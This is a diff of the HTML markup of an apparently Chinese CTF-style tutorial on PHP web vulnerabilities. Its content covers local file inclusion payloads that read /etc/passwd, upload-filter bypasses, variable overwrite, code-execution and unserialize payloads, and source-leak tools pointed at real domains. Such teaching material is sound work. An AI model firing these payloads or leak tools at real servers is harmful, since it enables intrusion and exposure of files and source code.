@@ -3,7 +3,7 @@
 <span class=k>if</span> <span class=p>(</span><span class=nb>file_exists</span><span class=p>(</span><span class=s1>&#39;/home/wwwrun/&#39;</span><span class=o>.</span><span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>))</span> <span class=p>{</span>
   <span class=k>include</span> <span class=s1>&#39;/home/wwwrun/&#39;</span><span class=o>.</span><span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;.php&#39;</span><span class=p>;</span>
 <span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p> <ul> <li><code>%00</code> 截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../etc/passwd%00
 </code></pre></div> <p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p> <ul> <li>路径长度截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
 </code></pre></div> <p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p> <ul> <li>点号截断</li> </ul> <div class=highlight><pre><span></span><code>?file=../../../../../../../../../boot.ini/………[…]…………
@@ -20,21 +20,21 @@
 </code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 PHP 流 filter</li> </ul> <div class=highlight><pre><span></span><code>?file=php://filter/convert.base64-encode/resource=index.php
 </code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 data URIs</li> </ul> <div class=highlight><pre><span></span><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
 </code></pre></div> <p>需要 <code>allow_url_include=On</code> 。</p> <ul> <li>利用 XSS 执行</li> </ul> <div class=highlight><pre><span></span><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode
-</code></pre></div> <p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p> <h2 id=_4>文件上传<a class=headerlink href=#_4 title="Permanent link">&para;</a></h2> <p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p> <h3 id=_5>绕过上传检查<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <ul> <li>前端检查扩展名</li> </ul> <p>抓包绕过即可。</p> <ul> <li><code>Content-Type</code> 检测文件类型</li> </ul> <p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p> <ul> <li>服务端添加后缀</li> </ul> <p>尝试 <code>%00</code> 截断。</p> <ul> <li>服务端扩展名检测</li> </ul> <p>利用解析漏洞。</p> <ul> <li>Apache 解析</li> </ul> <p>Apache 对后缀解析是从右向左的</p> <p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p> <ul> <li>IIS 解析</li> </ul> <p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p> <ul> <li>PHP CGI 路径解析</li> </ul> <p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p> <div class=highlight><pre><span></span><code><span class=k>location</span><span class=w> </span><span class=p>~</span><span class=w> </span><span class=sr>\.php$</span><span class=w> </span><span class=p>{</span><span class=w></span>
-<span class=w>  </span><span class=kn>root</span><span class=w> </span><span class=s>html</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=kn>fastcgi_pass</span><span class=w> </span><span class=n>127.0.0.1</span><span class=p>:</span><span class=mi>9000</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=kn>fastcgi_index</span><span class=w> </span><span class=s>index.php</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=kn>fastcgi_param</span><span class=w> </span><span class=s>SCRIPT_FILENAME</span><span class=w> </span><span class=s>/scripts</span><span class=nv>$fastcgi_script_name</span><span class=p>;</span><span class=w></span>
-<span class=w>  </span><span class=kn>include</span><span class=w> </span><span class=s>fastcgi_param</span><span class=p>;</span><span class=w></span>
-<span class=p>}</span><span class=w></span>
-</code></pre></div> <ul> <li>其他方式</li> </ul> <p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p> <h2 id=_6>变量覆盖<a class=headerlink href=#_6 title="Permanent link">&para;</a></h2> <h3 id=_7>全局变量覆盖<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。</p> <div class=highlight><pre><span></span><code><span class=na>register_globals</span><span class=o>=</span><span class=s>ON</span><span class=w></span>
+</code></pre></div> <p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p> <h2 id=_4>文件上传<a class=headerlink href=#_4 title="Permanent link">&para;</a></h2> <p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p> <h3 id=_5>绕过上传检查<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <ul> <li>前端检查扩展名</li> </ul> <p>抓包绕过即可。</p> <ul> <li><code>Content-Type</code> 检测文件类型</li> </ul> <p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p> <ul> <li>服务端添加后缀</li> </ul> <p>尝试 <code>%00</code> 截断。</p> <ul> <li>服务端扩展名检测</li> </ul> <p>利用解析漏洞。</p> <ul> <li>Apache 解析</li> </ul> <p>Apache 对后缀解析是从右向左的</p> <p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p> <ul> <li>IIS 解析</li> </ul> <p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p> <ul> <li>PHP CGI 路径解析</li> </ul> <p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p> <div class=highlight><pre><span></span><code><span class=k>location</span><span class=w> </span><span class=p>~</span><span class=w> </span><span class=sr>\.php$</span><span class=w> </span><span class=p>{</span>
+<span class=w>  </span><span class=kn>root</span><span class=w> </span><span class=s>html</span><span class=p>;</span>
+<span class=w>  </span><span class=kn>fastcgi_pass</span><span class=w> </span><span class=n>127.0.0.1</span><span class=p>:</span><span class=mi>9000</span><span class=p>;</span>
+<span class=w>  </span><span class=kn>fastcgi_index</span><span class=w> </span><span class=s>index.php</span><span class=p>;</span>
+<span class=w>  </span><span class=kn>fastcgi_param</span><span class=w> </span><span class=s>SCRIPT_FILENAME</span><span class=w> </span><span class=s>/scripts</span><span class=nv>$fastcgi_script_name</span><span class=p>;</span>
+<span class=w>  </span><span class=kn>include</span><span class=w> </span><span class=s>fastcgi_param</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></div> <ul> <li>其他方式</li> </ul> <p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p> <h2 id=_6>变量覆盖<a class=headerlink href=#_6 title="Permanent link">&para;</a></h2> <h3 id=_7>全局变量覆盖<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <p>变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。</p> <div class=highlight><pre><span></span><code><span class=na>register_globals</span><span class=o>=</span><span class=s>ON</span>
 </code></pre></div> <p>示例</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=k>echo</span> <span class=s2>&quot;Register_globals: &quot;</span> <span class=o>.</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nb>ini_get</span><span class=p>(</span><span class=s2>&quot;register_globals&quot;</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&quot;&lt;br/&gt;&quot;</span><span class=p>;</span>
 
 <span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span><span class=p>)</span> <span class=p>{</span>
   <span class=k>echo</span> <span class=s2>&quot;private!&quot;</span><span class=p>;</span>
 <span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p> <h3 id=extract><code>extract()</code> 变量覆盖<a class=headerlink href=#extract title="Permanent link">&para;</a></h3> <p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p> <div class=highlight><pre><span></span><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
 </code></pre></div> <p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p> <p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$auth</span> <span class=o>=</span> <span class=s2>&quot;0&quot;</span><span class=p>;</span>
@@ -45,7 +45,7 @@
 <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
   <span class=k>echo</span> <span class=s2>&quot;public!&quot;</span><span class=p>;</span>
 <span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p> <h3 id=import_request_variables><code>import_request_variables</code> 变量覆盖<a class=headerlink href=#import_request_variables title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>bool import_request_variables (string $types [, string $prefix])
 </code></pre></div> <p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$auth</span> <span class=o>=</span> <span class=s2>&quot;0&quot;</span><span class=p>;</span>
@@ -56,7 +56,7 @@
 <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
   <span class=k>echo</span> <span class=s2>&quot;public!&quot;</span><span class=p>;</span>
 <span class=p>}</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p> <h3 id=parse_str><code>parse_str()</code> 变量覆盖<a class=headerlink href=#parse_str title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>void parse_str ( string $str [, array &amp;$arr ])
 </code></pre></div> <p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p> <div class=highlight><pre><span></span><code><span class=x>// var.php?var=new  变量覆盖</span>
 <span class=x>$var = &quot;init&quot;;</span>
@@ -74,7 +74,7 @@
 </code></pre></div> <h3 id=preg_replace><code>preg_replace()</code> 代码执行<a class=headerlink href=#preg_replace title="Permanent link">&para;</a></h3> <p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class=p>;</span>
 <span class=nb>preg_replace</span><span class=p>(</span><span class=s2>&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span><span class=p>,</span> <span class=s2>&quot;addslashes(</span><span class=se>\\</span><span class=s2>1)&quot;</span><span class=p>,</span> <span class=nv>$var</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p> <h3 id=preg_match><code>preg_match</code> 代码执行<a class=headerlink href=#preg_match title="Permanent link">&para;</a></h3> <p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p> <div class=highlight><pre><span></span><code>&lt;?php
 include &#39;flag.php&#39;;
 if(isset($_GET[&#39;code&#39;])){
@@ -134,22 +134,22 @@ if(isset($_GET[&#39;code&#39;])){
 <span class=nv>$dyn_func</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;dyn_func&quot;</span><span class=p>];</span>
 <span class=nv>$argument</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;argument&quot;</span><span class=p>];</span>
 <span class=nv>$dyn_func</span><span class=p>(</span><span class=nv>$argument</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <h3 id=_12>反引号命令执行<a class=headerlink href=#_12 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=k>echo</span> <span class=sb>`ls -al`</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <h3 id=curly-syntax>Curly Syntax<a class=headerlink href=#curly-syntax title="Permanent link">&para;</a></h3> <p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;aaabbbccc </span><span class=si>${</span><span class=nv>`ls`</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$foobar</span> <span class=o>=</span> <span class=s2>&quot;phpinfo&quot;</span><span class=p>;</span>
 <span class=err>$</span><span class=p>{</span><span class=s2>&quot;foobar&quot;</span><span class=p>}();</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <h3 id=_13>回调函数<a class=headerlink href=#_13 title="Permanent link">&para;</a></h3> <p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$evil_callback</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;callback&quot;</span><span class=p>];</span>
 <span class=nv>$some_array</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
 <span class=nv>$new_array</span> <span class=o>=</span> <span class=nb>array_map</span><span class=p>(</span><span class=nv>$evil_callback</span><span class=p>,</span> <span class=nv>$some_array</span><span class=p>);</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>攻击 payload</p> <div class=highlight><pre><span></span><code>http://www.a.com/index.php?callback=phpinfo
 </code></pre></div> <h3 id=_14>反序列化<a class=headerlink href=#_14 title="Permanent link">&para;</a></h3> <p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=k>class</span> <span class=nc>Example</span> <span class=p>{</span>
@@ -159,13 +159,13 @@ if(isset($_GET[&#39;code&#39;])){
   <span class=p>}</span>
 <span class=p>}</span>
 <span class=nb>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&quot;saved_code&quot;</span><span class=p>]);</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>攻击 payload</p> <div class=highlight><pre><span></span><code>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
 </code></pre></div> <h2 id=php_1>PHP 特性<a class=headerlink href=#php_1 title="Permanent link">&para;</a></h2> <h3 id=_15>数组<a class=headerlink href=#_15 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=cp>&lt;?php</span>
 <span class=nv>$var</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
 <span class=nv>$var</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
 <span class=nv>$var</span> <span class=o>=</span> <span class=s2>&quot;string&quot;</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=x></span>
+<span class=cp>?&gt;</span>
 </code></pre></div> <p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p> <p>比如在 <code>$a == $b</code> 的比较中</p> <div class=highlight><pre><span></span><code><span class=x>$a = null; </span>
 <span class=x>$b = false; //为真 </span>
 <span class=x>$a = &#39;&#39;; </span>
@@ -215,82 +215,82 @@ if(isset($_GET[&#39;code&#39;])){
 /.git/index
 /.git/config
 /.git/description
-</code></pre></div> <p><a href=https://github.com/lijiejie/GitHack>GitHack</a></p> <div class=highlight><pre><span></span><code>python GitHack.py http://www.openssl.org/.git/
-</code></pre></div> <p><a href=https://github.com/WangYihang/GitHacker>GitHacker（可恢复完整 Git 仓库）</a></p> <div class=highlight><pre><span></span><code>python GitHacker.py http://www.openssl.org/.git/
-</code></pre></div> <h3 id=ds_store><code>.DS_Store</code> 文件泄露<a class=headerlink href=#ds_store title="Permanent link">&para;</a></h3> <p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p> <p><a href=https://github.com/lijiejie/ds_store_exp>利用工具 ds_store_exp</a></p> <div class=highlight><pre><span></span><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
+</code></pre></div> <p><a href=https://github.com/lijiejie/GitHack>GitHack</a></p> <div class=highlight><pre><span></span><code>python<span class=w> </span>GitHack.py<span class=w> </span>http://www.openssl.org/.git/
+</code></pre></div> <p><a href=https://github.com/WangYihang/GitHacker>GitHacker（可恢复完整 Git 仓库）</a></p> <div class=highlight><pre><span></span><code>python<span class=w> </span>GitHacker.py<span class=w> </span>http://www.openssl.org/.git/
+</code></pre></div> <h3 id=ds_store><code>.DS_Store</code> 文件泄露<a class=headerlink href=#ds_store title="Permanent link">&para;</a></h3> <p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p> <p><a href=https://github.com/lijiejie/ds_store_exp>利用工具 ds_store_exp</a></p> <div class=highlight><pre><span></span><code>python<span class=w> </span>ds_store_exp.py<span class=w> </span>http://hd.zj.qq.com/themes/galaxyw/.DS_Store
 
 hd.zj.qq.com/
-└── themes
-    └── galaxyw
-        ├── app
-        │   └── css
-        │       └── style.min.css
-        ├── cityData.min.js
-        ├── images
-        │   └── img
-        │       ├── bg-hd.png
-        │       ├── bg-item-activity.png
-        │       ├── bg-masker-pop.png
-        │       ├── btn-bm.png
-        │       ├── btn-login-qq.png
-        │       ├── btn-login-wx.png
-        │       ├── ico-add-pic.png
-        │       ├── ico-address.png
-        │       ├── ico-bm.png
-        │       ├── ico-duration-time.png
-        │       ├── ico-pop-close.png
-        │       ├── ico-right-top-delete.png
-        │       ├── page-login-hd.png
-        │       ├── pic-masker.png
-        │       └── ticket-selected.png
-        └── member
-            ├── assets
-            │   ├── css
-            │   │   ├── ace-reset.css
-            │   │   └── antd.css
-            │   └── lib
-            │       ├── cityData.min.js
-            │       └── ueditor
-            │           ├── index.html
-            │           ├── lang
-            │           │   └── zh-cn
-            │           │       ├── images
-            │           │       │   ├── copy.png
-            │           │       │   ├── localimage.png
-            │           │       │   ├── music.png
-            │           │       │   └── upload.png
-            │           │       └── zh-cn.js
-            │           ├── php
-            │           │   ├── action_crawler.php
-            │           │   ├── action_list.php
-            │           │   ├── action_upload.php
-            │           │   ├── config.json
-            │           │   ├── controller.php
-            │           │   └── Uploader.class.php
-            │           ├── ueditor.all.js
-            │           ├── ueditor.all.min.js
-            │           ├── ueditor.config.js
-            │           ├── ueditor.parse.js
-            │           └── ueditor.parse.min.js
-            └── static
-                ├── css
-                │   └── page.css
-                ├── img
-                │   ├── bg-table-title.png
-                │   ├── bg-tab-say.png
-                │   ├── ico-black-disabled.png
-                │   ├── ico-black-enabled.png
-                │   ├── ico-coorption-person.png
-                │   ├── ico-miss-person.png
-                │   ├── ico-mr-person.png
-                │   ├── ico-white-disabled.png
-                │   └── ico-white-enabled.png
-                └── scripts
-                    ├── js
-                    └── lib
-                        └── jquery.min.js
+└──<span class=w> </span>themes
+<span class=w>    </span>└──<span class=w> </span>galaxyw
+<span class=w>        </span>├──<span class=w> </span>app
+<span class=w>        </span>│<span class=w>   </span>└──<span class=w> </span>css
+<span class=w>        </span>│<span class=w>       </span>└──<span class=w> </span>style.min.css
+<span class=w>        </span>├──<span class=w> </span>cityData.min.js
+<span class=w>        </span>├──<span class=w> </span>images
+<span class=w>        </span>│<span class=w>   </span>└──<span class=w> </span>img
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>bg-hd.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>bg-item-activity.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>bg-masker-pop.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>btn-bm.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>btn-login-qq.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>btn-login-wx.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-add-pic.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-address.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-bm.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-duration-time.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-pop-close.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>ico-right-top-delete.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>page-login-hd.png
+<span class=w>        </span>│<span class=w>       </span>├──<span class=w> </span>pic-masker.png
+<span class=w>        </span>│<span class=w>       </span>└──<span class=w> </span>ticket-selected.png
+<span class=w>        </span>└──<span class=w> </span>member
+<span class=w>            </span>├──<span class=w> </span>assets
+<span class=w>            </span>│<span class=w>   </span>├──<span class=w> </span>css
+<span class=w>            </span>│<span class=w>   </span>│<span class=w>   </span>├──<span class=w> </span>ace-reset.css
+<span class=w>            </span>│<span class=w>   </span>│<span class=w>   </span>└──<span class=w> </span>antd.css
+<span class=w>            </span>│<span class=w>   </span>└──<span class=w> </span>lib
+<span class=w>            </span>│<span class=w>       </span>├──<span class=w> </span>cityData.min.js
+<span class=w>            </span>│<span class=w>       </span>└──<span class=w> </span>ueditor
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>index.html
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>lang
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>└──<span class=w> </span>zh-cn
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>├──<span class=w> </span>images
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>│<span class=w>   </span>├──<span class=w> </span>copy.png
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>│<span class=w>   </span>├──<span class=w> </span>localimage.png
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>│<span class=w>   </span>├──<span class=w> </span>music.png
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>│<span class=w>   </span>└──<span class=w> </span>upload.png
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>       </span>└──<span class=w> </span>zh-cn.js
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>php
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>├──<span class=w> </span>action_crawler.php
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>├──<span class=w> </span>action_list.php
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>├──<span class=w> </span>action_upload.php
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>├──<span class=w> </span>config.json
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>├──<span class=w> </span>controller.php
+<span class=w>            </span>│<span class=w>           </span>│<span class=w>   </span>└──<span class=w> </span>Uploader.class.php
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>ueditor.all.js
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>ueditor.all.min.js
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>ueditor.config.js
+<span class=w>            </span>│<span class=w>           </span>├──<span class=w> </span>ueditor.parse.js
+<span class=w>            </span>│<span class=w>           </span>└──<span class=w> </span>ueditor.parse.min.js
+<span class=w>            </span>└──<span class=w> </span>static
+<span class=w>                </span>├──<span class=w> </span>css
+<span class=w>                </span>│<span class=w>   </span>└──<span class=w> </span>page.css
+<span class=w>                </span>├──<span class=w> </span>img
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>bg-table-title.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>bg-tab-say.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-black-disabled.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-black-enabled.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-coorption-person.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-miss-person.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-mr-person.png
+<span class=w>                </span>│<span class=w>   </span>├──<span class=w> </span>ico-white-disabled.png
+<span class=w>                </span>│<span class=w>   </span>└──<span class=w> </span>ico-white-enabled.png
+<span class=w>                </span>└──<span class=w> </span>scripts
+<span class=w>                    </span>├──<span class=w> </span>js
+<span class=w>                    </span>└──<span class=w> </span>lib
+<span class=w>                        </span>└──<span class=w> </span>jquery.min.js
 
-<span class=m>21</span> directories, <span class=m>48</span> files
+<span class=m>21</span><span class=w> </span>directories,<span class=w> </span><span class=m>48</span><span class=w> </span>files
 </code></pre></div> <h3 id=_20>网站备份文件<a class=headerlink href=#_20 title="Permanent link">&para;</a></h3> <p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p> <p>常见的后缀名：</p> <div class=highlight><pre><span></span><code>.rar
 .zip
 .7z
@@ -301,12 +301,12 @@ hd.zj.qq.com/
 </code></pre></div> <h3 id=svn>SVN 泄露<a class=headerlink href=#svn title="Permanent link">&para;</a></h3> <p>敏感文件：</p> <div class=highlight><pre><span></span><code>/.svn
 /.svn/wc.db
 /.svn/entries
-</code></pre></div> <p><a href=https://github.com/kost/dvcs-ripper>dvcs-ripper</a></p> <div class=highlight><pre><span></span><code>perl rip-svn.pl -v -u http://www.example.com/.svn/
+</code></pre></div> <p><a href=https://github.com/kost/dvcs-ripper>dvcs-ripper</a></p> <div class=highlight><pre><span></span><code>perl<span class=w> </span>rip-svn.pl<span class=w> </span>-v<span class=w> </span>-u<span class=w> </span>http://www.example.com/.svn/
